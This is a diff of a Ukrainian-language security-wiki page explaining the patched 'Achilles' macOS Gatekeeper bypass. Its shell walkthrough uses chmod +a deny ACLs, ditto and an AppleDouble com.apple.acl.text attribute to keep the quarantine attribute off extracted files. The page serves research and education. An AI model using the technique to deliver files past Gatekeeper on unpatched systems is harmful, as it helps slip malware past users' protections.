@@ -1,12 +1,71 @@
-# macOS xattr-acls: додаткові матеріали
+# Відтворення обходу карантину через AppleDouble ACL
 
 {{#include ../../../../banners/hacktricks-training.md}}
 
-Цей історичний proof of concept відтворює техніку AppleDouble/ACL, використану в дослідженні обходу Gatekeeper Achilles. Він серіалізує ACL, зберігає його в допоміжному файлі AppleDouble, перейменовує атрибут на `com.apple.acl.text` і повторно пакує ZIP.<sup>[[1]](#references)[[2]](#references)</sup>
+Цей історичний proof of concept відтворює техніку AppleDouble/ACL, використану в дослідженні обходу Achilles Gatekeeper. Він серіалізує ACL, зберігає його у файлі-супутнику AppleDouble, перейменовує атрибут на `com.apple.acl.text` і перепаковує ZIP.<sup>[[1]](#references)[[2]](#references)</sup>
 
-Apple усунула обхід Gatekeeper у macOS Ventura 13, Monterey 12.6.2 і Big Sur 11.7.2; відновлення ACL на сучасному Mac не демонструє працездатний обхід Gatekeeper.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>
+Apple усунула обхід Gatekeeper у macOS Ventura 13, Monterey 12.6.2 і Big Sur 11.7.2; відновлення ACL на сучасному Mac не демонструє робочий обхід Gatekeeper.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>
 
-Про перевірки quarantine та першого запуску див. [macOS Gatekeeper](../macos-gatekeeper.md#gatekeeper-bypasses).
+Перевірки карантину та першого запуску описано в розділі [macOS Gatekeeper](../macos-gatekeeper.md#gatekeeper-bypasses).
+
+## Поведінка ACL і файлової системи AppleDouble
+
+### writeextattr ACL
+
+Цей ACL запобігає додаванню `xattrs` до файлу
+
+```bash
+rm -rf /tmp/test*
+echo test >/tmp/test
+chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
+ls -le /tmp/test
+ditto -c -k test test.zip
+# Download the zip from the browser and decompress it, the file should be without a quarantine xattr
+
+cd /tmp
+echo y | rm test
+
+# Decompress it with ditto
+ditto -x -k --rsrc test.zip .
+ls -le /tmp/test
+
+# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
+open test.zip
+sleep 1
+ls -le /tmp/test
+```
+
+### **com.apple.acl.text xattr + AppleDouble**
+
+Формат файлів **AppleDouble** копіює файл разом із його ACE.
+
+У [**вихідному коді**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) можна побачити, що текстове представлення ACL, збережене всередині xattr під назвою **`com.apple.acl.text`**, буде встановлено як ACL для розпакованого файлу. Тож якщо стиснути застосунок у zip-файл у форматі **AppleDouble** з ACL, який перешкоджає запису інших xattr до нього... xattr quarantine не встановиться для застосунку:
+
+Докладнішу інформацію див. у [**оригінальному звіті**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/).<sup>[[1]](#references)</sup>
+
+Щоб відтворити це, спершу потрібно отримати правильний рядок ACL:
+
+```bash
+# Everything will be happening here
+mkdir /tmp/temp_xattrs
+cd /tmp/temp_xattrs
+
+# Create a folder and a file with the acls and xattr
+mkdir del
+mkdir del/test_fold
+echo test > del/test_fold/test_file
+chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
+chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
+ditto -c -k del test.zip
+
+# uncomporess to get it back
+ditto -x -k --rsrc test.zip .
+ls -le test
+```
+
+(Зверніть увагу, що навіть якщо це спрацює, sandbox спершу запише quarantine xattr)
+
+## Створення та перевірка sidecar-файлу AppleDouble
 
 ```bash
 rm -rf /tmp/test*
@@ -77,7 +136,7 @@ echo something > start/protected/something
 
 <details>
 
-<summary>Код set_xattr</summary>
+<summary>Код функції set_xattr</summary>
 
 ```c
 // gcc -o set_xattr set_xattr.c
@@ -191,7 +250,7 @@ xattr -p com.apple.quarantine protected
 
 ## References
 
-- [1] [Блог Microsoft Security — Ахіллесова п’ята Gatekeeper: виявлення вразливості macOS](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)
+- [1] [Microsoft Security Blog — Ахіллесова п’ята Gatekeeper: виявлення вразливості macOS](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)
 - [2] [Apple Developer — Пакування програмного забезпечення Mac для розповсюдження за допомогою `ditto`](https://developer.apple.com/documentation/xcode/packaging-mac-software-for-distribution)
 - [3] [Apple Support — Про вміст безпеки macOS Ventura 13](https://support.apple.com/en-ae/102853)
 - [4] [Apple Support — Про вміст безпеки macOS Monterey 12.6.2](https://support.apple.com/en-ae/102806)
